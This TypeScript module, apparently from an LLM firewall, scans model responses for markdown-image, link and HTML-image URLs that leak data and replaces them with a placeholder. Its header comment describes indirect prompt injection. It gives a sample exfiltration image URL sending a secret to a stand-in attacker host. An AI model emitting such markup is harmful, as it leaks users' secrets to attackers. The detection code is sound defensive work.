// Response-side exfiltration detection.
//
// A model whose context was poisoned (indirect prompt injection) often exfils
// data by emitting markup the CLIENT auto-renders. The classic zero-click vector
// is a markdown image — `![x](https://attacker/?d=<secret>)` — which the chat UI
// fetches immediately, leaking the query string to the attacker without the user
// ever clicking. Markdown/HTML links are the one-click variant. The firewall sees
// this in the model's RESPONSE, not the request, so it needs its own scan.
//
// This module is pure: it extracts candidate URLs from response text and asks an
// injected predicate whether each destination is an exfil sink (the proxy backs
// that predicate with the existing UrlClassifier, so the allowlist, known-sink
// list, DGA and path-exfil heuristics are all reused). No network, no provider
// coupling — it scans the raw decoded body, so it works for every provider shape.

export interface ExfilFinding {
  url: string
  /** How the URL was embedded — markdown image is the highest concern (auto-fetched). */
  kind: 'markdown-image' | 'markdown-link' | 'html-image'
  reason: string
}

// `!\[alt\](url)` — markdown image. URL stops at whitespace, ')' or '>'.
const MD_IMAGE_RE = /!\[[^\]]*\]\(\s*<?(https?:\/\/[^\s)>]+)>?[^)]*\)/gi
// `\[text\](url)` — markdown link (not preceded by '!', which is the image form).
const MD_LINK_RE = /(?<!!)\[[^\]]*\]\(\s*<?(https?:\/\/[^\s)>]+)>?[^)]*\)/gi
// `<img ... src="url">` — HTML image (some renderers allow raw HTML).
const HTML_IMG_RE = /<img\b[^>]*?\bsrc\s*=\s*["']?(https?:\/\/[^"'\s>]+)/gi

function parseUrl(u: string): { hostname: string; path: string } | null {
  try {
    const url = new URL(u)
    return { hostname: url.hostname, path: url.pathname + url.search }
  } catch {
    return null
  }
}

/**
 * Scan response text for exfiltration markup.
 *
 * @param text       the decoded model response (raw JSON/SSE text is fine — URLs
 *                   live inside the text fields and are matched literally)
 * @param isExfil    predicate deciding whether a (hostname, path) is an exfil
 *                   sink; backed by UrlClassifier in production
 * @returns deduped findings, markdown images first (highest concern)
 */
export function scanResponseExfil(
  text: string,
  isExfil: (hostname: string, path: string) => boolean,
): ExfilFinding[] {
  if (!text) return []
  const findings: ExfilFinding[] = []
  const seen = new Set<string>()

  const scan = (re: RegExp, kind: ExfilFinding['kind']) => {
    re.lastIndex = 0
    let m: RegExpExecArray | null
    while ((m = re.exec(text)) !== null) {
      const url = m[1]
      if (!url) { if (m.index === re.lastIndex) re.lastIndex++; continue }
      const parsed = parseUrl(url)
      if (parsed && isExfil(parsed.hostname, parsed.path)) {
        const key = kind + '|' + url
        if (!seen.has(key)) {
          seen.add(key)
          findings.push({ url, kind, reason: `${kind} points at an exfiltration destination (${parsed.hostname})` })
        }
      }
      if (m.index === re.lastIndex) re.lastIndex++
    }
  }

  scan(MD_IMAGE_RE, 'markdown-image')
  scan(HTML_IMG_RE, 'html-image')
  scan(MD_LINK_RE, 'markdown-link')
  return findings
}

/**
 * Neutralize exfil URLs in a (buffered) response body by replacing each offending
 * URL with an inert placeholder, keeping the surrounding text/JSON intact so the
 * agent still receives a valid turn — just without the auto-fetch.
 */
export function neutralizeExfil(body: string, findings: ExfilFinding[]): string {
  let out = body
  for (const f of findings) {
    out = out.split(f.url).join('llm-fw-blocked-exfil-url')
  }
  return out
}
